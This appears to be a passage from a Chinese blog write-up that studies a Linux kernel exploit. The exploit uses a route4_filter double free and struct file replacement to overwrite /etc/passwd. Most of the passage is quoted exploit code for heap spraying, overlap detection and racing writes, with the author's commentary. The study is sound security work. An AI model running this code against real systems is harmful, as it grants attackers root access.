<li>先存在一个进程向一个可写文件写入大量内容，inode锁会锁住较长时间</li>
<li>第二个进程尝试向该文件写入”打算写入/etc/passwd等特权文件的内容”</li>
<li>第三个进程利用漏洞替换file结构体</li>
</ol>
<p>到这里对struct file的攻击就已经闭环了。</p>
<h5 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h5><p>对于file类型凭据我们可以使用普通用户可读特权用户可写的/etc/passwd来进行操作，普通用户就可以喷射大量目标用于攻击。但特权的struct cred就没那么容易了。可以通过：</p>
<p>执行大量suid 程序，如sudo(但大部分情况下并没有这个权限)<br>使用kernel thread，kernel 自己创建的任务是特权任务，我们可以利用一些内核接口控制内核启动一堆kernel thread：</p>
<ul>
<li>利用workqueue</li>
<li>利用usermode helper</li>
</ul>
<h3 id="reading-exp"><a href="#reading-exp" class="headerlink" title="reading exp"></a>reading exp</h3><p>终于到了阅读exp的阶段了，距离写下这篇文章的第一行似乎已经过了两周了。。。令人感叹。</p>
<p>进程A，随时准备喷射<code>/etc/passwd</code>文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 12. Thread 3 - spray 4096*2 priviledged `file` objects to replace unprivileged `file` (wait pipe_file_spray[0])</span></span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))   <span class="comment">// use pipe_file_spray to notify</span></span><br><span class="line">      err(<span class="number">1</span>, <span class="string">&quot;[-] read file spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[12] got cmd, start spraying 4096*2 `file` by opening %s\n&quot;</span>, target);</span><br><span class="line">    spray_num = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// spray 4096 `file` (parent-process)</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        open(target, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">10000</span>);&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面是进程B的代码，但是在进程B执行之前得等进程C执行完，进程C就是堆喷一堆<code>struct file</code>来耗尽<code>file slab</code>中的空闲object，进程B就是干了一件事，堆喷很多的<code>route4_filter </code>,然后把他释放掉，但是它申请的handler都不为0.所以只起了一个耗尽通用slab的obj的作用，等后面全部free的时候就会把对应页交给伙伴系统了。</p>
<p>但我其实不是很能理解为什么要设置<code>user namespace</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">setup_namespace();</span><br><span class="line">      pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">      assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">      add_qdisc(sprayfd);</span><br><span class="line"><span class="comment">// 2-1. prepare payload</span></span><br><span class="line">      <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">      <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">      <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] failed read defrag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">      <span class="keyword">int</span> middle = <span class="number">38</span>;       <span class="comment">// 38</span></span><br><span class="line">      <span class="keyword">int</span> end = middle + <span class="number">40</span>; <span class="comment">// 40</span></span><br><span class="line"><span class="comment">// 2-2. spray (38+3)*32 filters in kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">        add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4. spray more filters in kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">      <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[4] spray kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">        add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"><span class="comment">// 5. free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// prevent double free of 192 and being reclaimed by others</span></span><br><span class="line">        <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line"><span class="comment">// 7. free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">      <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">        delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//getchar();</span></span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">1000</span>);&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进程D是关键进程，首先确定已经可以doublefree了，然后喷射一堆低凭证file,接着第一次kfree大小为0x100的obj,然后喷射一堆低凭证file拿到刚free的obj,接着doublefree这个obj,然后再喷射低凭证file,这样就有两个文件描述符指向同一个file而且这个file的f_count为1，接着开启三个线程，替换第凭证为高凭证，前面我已经说过过程了，就不赘述了.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">slow_write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[11-1] start slow write\n&quot;</span>);</span><br><span class="line">  <span class="keyword">clock_t</span> start, end;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] error open uaf file&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">  <span class="keyword">int</span> offset;</span><br><span class="line">  <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++) &#123;     <span class="comment">// mmap space [0x30000000, 0x30000000 + 0x1000 * 0x80000 / 20]</span></span><br><span class="line">    <span class="keyword">void</span> *r = mmap((<span class="keyword">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">  &#125;</span><br><span class="line">  assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *mem = (<span class="keyword">void</span> *)(addr);</span><br><span class="line">  <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// write plenty of data (0x80000 * 0x1000 = 0x80 000 000 = 2GB)</span></span><br><span class="line">    iov[i].iov_base = mem;</span><br><span class="line">    iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  run_write = <span class="number">1</span>;    <span class="comment">// notifiy thread 2 (unprivileged `file`) begin to write evil data</span></span><br><span class="line">  start = clock();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">  end = clock();</span><br><span class="line">  <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">  run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write_cmd() —— thread 2: write evil data to the privileged file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_cmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = content, .iov_len = <span class="built_in">strlen</span>(content)&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!run_write) &#123;&#125;  <span class="comment">// wait for thread 1 to prepare write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[11-2] write evil data after the slow write\n&quot;</span>);</span><br><span class="line">  run_spray = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get old limits</span></span><br><span class="line">  <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">           <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">           old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">  pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line">  <span class="comment">// open &amp; setup the socket</span></span><br><span class="line">  sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">  assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">  add_qdisc(sockfd);</span><br><span class="line"><span class="comment">// 3. allocate a route4_filter (vulnerable object)</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[3] allocate the vulnerable filter\n&quot;</span>);</span><br><span class="line">  add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);  <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line"><span class="comment">// 6. 1st free the route4_filter, return the `kmalloc-256` page to the page allocator</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free the object, to free the slab</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[6] 1st freed the filter object\n&quot;</span>);</span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line">  add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">  usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line"><span class="comment">// 8. spray 4000 unprivileged `file`</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[8] spray 4000 uprivileged `file`\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++) &#123;</span><br><span class="line">    pin_on_cpu(i % cpu_cores);</span><br><span class="line">    fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;pause before 2nd free\n&quot;);</span></span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line"><span class="comment">// 9. 2nd free route4_filter, which will free the file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[9] 2nd free the filter object\n&quot;</span>);</span><br><span class="line">  add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pause after 2nd free\n&quot;</span>);</span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line">  <span class="comment">// sleep(10000);</span></span><br><span class="line">  usleep(<span class="number">1000</span> * <span class="number">100</span>);   <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. spray 5000 unprivileged `file` &amp; find the overlapped file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[10] spraying 5000 unprivileged `file`\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++) &#123;</span><br><span class="line">    pin_on_cpu(i % cpu_cores);</span><br><span class="line">    fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++) &#123;</span><br><span class="line"><span class="comment">// 10-1. spray one `file` &amp; use kcmp to check if we take up the vulnerable object</span></span><br><span class="line">      <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[10-1] found overlapped file, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">        overlap_a = fds[j];</span><br><span class="line">        overlap_b = fd_2[i];</span><br><span class="line"><span class="comment">// 11. start 2 threads: Thread 1-take up write lock; Thread 2-write evil data</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[11] start 2 threads compete to write\n&quot;</span>);</span><br><span class="line">        <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">        pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line"><span class="comment">// 12. spray privileged `file` object</span></span><br><span class="line">        close(overlap_a);     <span class="comment">// ??????????? why release twice ???????????</span></span><br><span class="line">        close(overlap_b);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">        write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">          err(<span class="number">1</span>, <span class="string">&quot;[-] read from file spray&quot;</span>);</span><br><span class="line">        overlapped = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (overlapped)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 13. finish exploitation</span></span><br><span class="line">  sleep(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">while</span> (run_write) &#123;sleep(<span class="number">1</span>);&#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[13] check whether we overwrite the privileged file\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!overlapped) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] no overlap found :(...\n&quot;</span>);</span><br><span class="line">    write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">// check if user (hi) in the passwd</span></span><br><span class="line">    read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>))</span><br><span class="line">      write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] not successful : %s\n&quot;</span>, buf);</span><br><span class="line">      write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">1000</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体过程可以看这两张图</p>
<p><img src="https://img-blog.csdnimg.cn/e177f920084e4a77b2d4efaad6ee5614.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/8baa8820341340a18143b5ed2731daa8.png#pic_center" alt="在这里插入图片描述"></p>
<p>调试了半个晚上终于把exp中关于file结构体引用计数的问题解决了，在一个进程中，主线程和所有的支线程共用一个<code>struct files_struct</code>结构体，所以在创建线程的时候并不会像创建子进程一样给所有的<code>file</code>的结构体的引用计数<code>f_count</code>加一，但是只要在子线程中使用了这个文件描述符<strong>（注意是使用，只有使用了才会加一，使用完还会减一）</strong>，就会给对应的<code>file</code>的<code>f_count</code>加一，表示这个结构体正在被使用，所以在主线程close这个文件描述符之后，对应的<code>file</code>并没有被kfree掉，而是引用计数减一，但是这个file指针是在主线程中被清零的。而在某个地方肯定还记录着这个<code>file</code>的指针，以便后续kfree。</p>
